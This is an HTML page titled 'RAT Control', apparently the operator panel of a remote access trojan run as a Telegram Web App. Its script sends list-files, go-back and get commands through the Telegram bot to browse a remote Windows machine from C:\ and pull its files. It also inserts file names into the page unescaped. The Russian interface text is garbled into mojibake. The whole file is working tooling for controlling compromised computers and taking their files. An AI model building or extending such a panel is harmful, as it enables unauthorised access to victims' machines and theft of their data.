<!DOCTYPE html>
<html>
<head>
    <title>RAT Control</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 16px;
            background: #f5f5f5;
        }
        .file-list {
            margin-top: 20px;
        }
        .file-item {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            cursor: pointer;
        }
        .file-item:hover {
            background: #e0e0e0;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 8px;
            display: none;
        }
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .loading.hidden {
            display: none;
        }
    </style>
</head>
<body>
    <h1>üìÅ –§–∞–π–ª–æ–≤—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä</h1>
    
    <div id="currentPath">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
    
    <div style="margin: 20px 0;">
        <button onclick="loadFiles()">üìã –û–±–Ω–æ–≤–∏—Ç—å —Å–ø–∏—Å–æ–∫</button>
        <button onclick="goBack()">‚¨ÜÔ∏è –ù–∞–∑–∞–¥</button>
    </div>
    
    <div id="fileList" class="file-list">
        –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏
    </div>
    
    <div class="loading hidden" id="loading">
        <div style="text-align: center;">
            <div style="font-size: 48px;">‚è≥</div>
            <div>–ó–∞–≥—Ä—É–∑–∫–∞...</div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let currentDir = 'C:\\';
        let pendingRequest = null;
        
        // –§—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤
        function loadFiles() {
            showLoading();
            pendingRequest = Date.now();
            
            tg.sendData(JSON.stringify({
                action: 'list_files',
                path: currentDir,
                requestId: pendingRequest
            }));
        }
        
        // –§—É–Ω–∫—Ü–∏—è "–ù–∞–∑–∞–¥"
        function goBack() {
            showLoading();
            pendingRequest = Date.now();
            
            tg.sendData(JSON.stringify({
                action: 'go_back',
                path: currentDir,
                requestId: pendingRequest
            }));
        }
        
        // –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤
        function displayFiles(data) {
            if (!data || !data.files) return;
            
            currentDir = data.current_dir;
            document.getElementById('currentPath').innerText = currentDir;
            
            let html = '';
            data.files.forEach(f => {
                const icon = f.is_dir ? 'üìÅ' : 'üìÑ';
                html += `
                    <div class="file-item" onclick="downloadFile('${f.name}')">
                        ${icon} ${f.name} 
                        <span style="float:right">${f.size}</span>
                    </div>
                `;
            });
            
            document.getElementById('fileList').innerHTML = html;
            hideLoading();
        }
        
        // –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞
        function downloadFile(name) {
            tg.sendData(JSON.stringify({
                action: 'get',
                path: currentDir + '\\' + name,
                requestId: Date.now()
            }));
        }
        
        // –ü–æ–∫–∞–∑ –∑–∞–≥—Ä—É–∑–∫–∏
        function showLoading() {
            document.getElementById('loading').classList.remove('hidden');
        }
        
        function hideLoading() {
            document.getElementById('loading').classList.add('hidden');
        }
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Ö–æ–¥—è—â–∏—Ö –¥–∞–Ω–Ω—ã—Ö
        tg.onEvent('web_app_data', function(data) {
            try {
                const response = JSON.parse(data);
                console.log('üì© –ü–æ–ª—É—á–µ–Ω–æ:', response);
                
                if (response.data && response.data.files) {
                    displayFiles(response.data);
                } else if (response.error) {
                    alert('–û—à–∏–±–∫–∞: ' + response.error);
                    hideLoading();
                }
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞:', e);
                hideLoading();
            }
        });
        
        // –ó–∞–≥—Ä—É–∂–∞–µ–º –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ
        setTimeout(loadFiles, 500);
    </script>
</body>
</html>
